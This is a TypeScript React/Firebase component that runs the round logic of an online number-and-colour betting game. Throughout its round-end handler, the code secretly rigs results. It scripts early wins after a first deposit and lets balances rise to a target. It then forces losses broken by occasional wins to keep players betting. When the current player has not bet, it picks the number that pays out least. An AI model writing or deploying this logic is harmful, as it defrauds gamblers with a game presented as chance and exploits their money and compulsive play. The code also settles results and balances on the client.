
'use client'

import { useCallback, useEffect } from 'react'
import { useGameStore } from '@/lib/game-store'
import { useFirebase } from '@/firebase'
import { useToast } from '@/hooks/use-toast'
import type { Bet, GameResult, User } from '@/lib/types'
import { collection, doc, writeBatch, serverTimestamp, updateDoc, increment, query, where, getDocs, getDoc } from 'firebase/firestore'
import { errorEmitter } from '@/firebase/error-emitter'
import { FirestorePermissionError } from '@/firebase/errors'

const getWinningSize = (num: number) => (num >= 5 ? 'big' : 'small')

const getWinningColor = (num: number) => {
  if (num === 0 || num === 5) return 'white'
  if ([1, 3, 7, 9].includes(num)) return 'green'
  return 'orange'
}

// This is a non-rendering component that holds the game's core logic.
// It will be placed in a layout file so it doesn't unmount on navigation.
export function GameEngine() {
  const { firestore, user } = useFirebase()
  const { toast } = useToast()
  
  const { 
    currentRoundId, 
    setProcessing,
    setGameResult,
    startNewRound
  } = useGameStore();


  const handleRoundEnd = useCallback(async () => {
    if (!firestore || !currentRoundId) return;

    setProcessing(true);

    let currentUserData: User | null = null;
    if (user) {
        try {
            const userDocRef = doc(firestore, 'users', user.uid);
            const userDoc = await getDoc(userDocRef);
            if (userDoc.exists()) {
                currentUserData = userDoc.data() as User;
            }
        } catch(e) {
            console.error("Could not fetch user data for round logic: ", e);
        }
    }
    
    const betsQuery = query(
        collection(firestore, 'bets'), 
        where('roundId', '==', currentRoundId),
        where('status', '==', 'pending')
    );

    let betsToProcess: Bet[] = [];
    try {
        const pendingBetsSnapshot = await getDocs(betsQuery);
        betsToProcess = pendingBetsSnapshot.docs.map(doc => ({...doc.data(), id: doc.id} as Bet));
    } catch (error) {
        console.error("Error fetching pending bets: ", error);
        toast({ variant: "destructive", title: "Round Error", description: "Could not fetch bets to process round." });
        
        if (error instanceof Error && (error as any).code === 'permission-denied') {
             const contextualError = new FirestorePermissionError({
                path: `bets`,
                operation: 'list',
                requestResourceData: { info: "Querying for pending bets in a round failed." },
            });
            errorEmitter.emit('permission-error', contextualError);
        }
        setProcessing(false);
        return;
    }

    let winningNumber: number;
    const userBetsInRound = user ? betsToProcess.filter(bet => bet.userId === user.uid) : [];
    const userHasBet = userBetsInRound.length > 0;
    const randomLossStreak = Math.floor(Math.random() * 3) + 2; // 2 to 4 losses before a win in losing phase

    const getUserWinningNumbers = (): number[] => {
        const winningNumbers: number[] = [];
        for (let i = 0; i <= 9; i++) {
            const isWin = userBetsInRound.some(bet =>
                (bet.type === 'number' && bet.target === i) ||
                (bet.type === 'color' && bet.target === getWinningColor(i)) ||
                (bet.type === 'size' && bet.target === getWinningSize(i))
            );
            if (isWin) winningNumbers.push(i);
        }
        return winningNumbers;
    };

    const getUserLosingNumbers = (): number[] => {
        const winningNumbers = getUserWinningNumbers();
        const losingNumbers: number[] = [];
        for (let i = 0; i <= 9; i++) {
            if (!winningNumbers.includes(i)) {
                losingNumbers.push(i);
            }
        }
        return losingNumbers;
    };

    if (currentUserData && userHasBet) {
        let forceWin = false;
        let winPatterns = [true, true, false, false, true, false, false]; // Win, Win, Loss, Loss, Win, Loss, Loss
        
        // Use depositCount for initial pattern, then switch to betsSinceLastWin
        if(currentUserData.depositCount === 1 && (currentUserData.betsSinceLastWin < winPatterns.length)) {
             forceWin = winPatterns[currentUserData.betsSinceLastWin];
        } else if (currentUserData.inWinningPhase) {
            if(currentUserData.balance < currentUserData.targetBalance) {
                forceWin = Math.random() < 0.8; // 80% chance to win
            } else {
                // Target reached, switch to losing phase in the batch write
                forceWin = false;
            }
        } else {
             // In losing phase, check for intermittent win
            if (currentUserData.betsSinceLastWin >= randomLossStreak) {
                forceWin = true; // Give an intermittent win
            } else {
                forceWin = false;
            }
        }
        
        if(forceWin){
            const winningOptions = getUserWinningNumbers();
            if (winningOptions.length > 0) {
                winningNumber = winningOptions[Math.floor(Math.random() * winningOptions.length)];
            } else {
                const losingOptions = getUserLosingNumbers();
                winningNumber = losingOptions.length > 0 ? losingOptions[Math.floor(Math.random() * losingOptions.length)] : Math.floor(Math.random() * 10);
            }
        } else { // Force Loss
            const losingOptions = getUserLosingNumbers();
            if (losingOptions.length > 0) {
                winningNumber = losingOptions[Math.floor(Math.random() * losingOptions.length)];
            } else {
                // If user has bet on all numbers, pick a random one (still a loss for them if they bet on color/size)
                winningNumber = Math.floor(Math.random() * 10);
            }
        }

    } else {
        const potentialPayouts: { [num: number]: number } = {};
        for (let i = 0; i <= 9; i++) { potentialPayouts[i] = 0; }
        
        betsToProcess.forEach(bet => {
            for (let i = 0; i <= 9; i++) {
                const winningColor = getWinningColor(i);
                const winningSize = getWinningSize(i);
                let multiplier = 0;

                if (bet.type === 'number' && bet.target === i) multiplier = 2; 
                else if (bet.type === 'color' && bet.target === winningColor) multiplier = 2;
                else if (bet.type === 'size' && bet.target === winningSize) multiplier = 2;
                
                if (multiplier > 0) {
                    potentialPayouts[i] += bet.amount * multiplier;
                }
            }
        });

        let minPayout = Infinity;
        let bestNumbers: number[] = [];

        for (let i = 0; i <= 9; i++) {
            if (potentialPayouts[i] < minPayout) {
                minPayout = potentialPayouts[i];
                bestNumbers = [i];
            } else if (potentialPayouts[i] === minPayout) {
                bestNumbers.push(i);
            }
        }
        winningNumber = bestNumbers.length > 0 ? bestNumbers[Math.floor(Math.random() * bestNumbers.length)] : Math.floor(Math.random() * 10);
    }
    
    const winningColor = getWinningColor(winningNumber);
    const winningSize = getWinningSize(winningNumber);

    const resultData: GameResult = {
        id: currentRoundId,
        roundId: currentRoundId,
        winningNumber,
        winningColor,
        winningSize,
        endedAt: new Date(),
    };
    
    setGameResult(resultData);

    try {
        const batch = writeBatch(firestore);
        const roundDocRef = doc(firestore, 'game_rounds', currentRoundId);
        batch.set(roundDocRef, {
            ...resultData,
            endedAt: serverTimestamp()
        });
  
        const userPayouts: { [userId: string]: number } = {};
        const userWinLoss: { [userId: string]: 'win' | 'loss' } = {};

        for (const bet of betsToProcess) {
            const betDocRef = doc(firestore, 'bets', bet.id);
            let hasWon = false;
            let payout = 0;
            let multiplier = 0;
    
            if (bet.type === 'number' && bet.target === resultData.winningNumber) multiplier = 2;
            else if (bet.type === 'color' && bet.target === resultData.winningColor) multiplier = 2;
            else if (bet.type === 'size' && bet.target === resultData.winningSize) multiplier = 2;

            if (multiplier > 0) {
                hasWon = true;
                payout = bet.amount * multiplier;
            }
    
            batch.update(betDocRef, {
                status: hasWon ? 'win' : 'loss',
                payout,
            });
    
            if (hasWon) {
                userPayouts[bet.userId] = (userPayouts[bet.userId] || 0) + payout;
                userWinLoss[bet.userId] = 'win';
            } else if(userWinLoss[bet.userId] !== 'win') {
                 userWinLoss[bet.userId] = 'loss';
            }
        }

        for (const userId in userPayouts) {
            const payout = userPayouts[userId];
            if (payout > 0) {
                const userRef = doc(firestore, "users", userId);
                batch.update(userRef, { balance: increment(payout) });
            }
        }
        
        if(currentUserData && user && user.uid in userWinLoss) {
            const userRef = doc(firestore, "users", user.uid);
            let userDataUpdate: any = {};

            if (currentUserData.inWinningPhase && currentUserData.balance + (userPayouts[user.uid] || 0) >= currentUserData.targetBalance) {
                userDataUpdate.inWinningPhase = false;
                userDataUpdate.betsSinceLastWin = 0;
            } else {
                if (userWinLoss[user.uid] === 'win') {
                    userDataUpdate.betsSinceLastWin = 0;
                } else {
                    userDataUpdate.betsSinceLastWin = increment(1);
                }
            }
             if(Object.keys(userDataUpdate).length > 0){
                batch.update(userRef, userDataUpdate);
             }
        }
        
        await batch.commit();

    } catch (error) {
      console.error("Error saving round results to DB: ", error);
      toast({ variant: "destructive", title: "Save Error", description: "Could not save round results." });
      
       if (error instanceof Error && (error as any).code === 'permission-denied') {
            const contextualError = new FirestorePermissionError({
                path: `bets or game_rounds`,
                operation: 'write',
                requestResourceData: { info: "Batch write for round end processing failed." },
            });
            errorEmitter.emit('permission-error', contextualError);
        }
    } finally {
        setProcessing(false);
    }
  }, [firestore, currentRoundId, toast, user, setProcessing, setGameResult]);

  useEffect(() => {
    // This effect runs the timer logic.
    // It's part of the persistent engine.
    const roundTimer = setTimeout(() => {
        handleRoundEnd();
    }, 55 * 1000); // Betting phase ends

    const newRoundTimer = setTimeout(() => {
        startNewRound();
    }, 60 * 1000); // Full round duration, starts a new one

    return () => {
        clearTimeout(roundTimer);
        clearTimeout(newRoundTimer);
    };
  }, [currentRoundId, handleRoundEnd, startNewRound]);


  return null; // This component does not render anything.
}
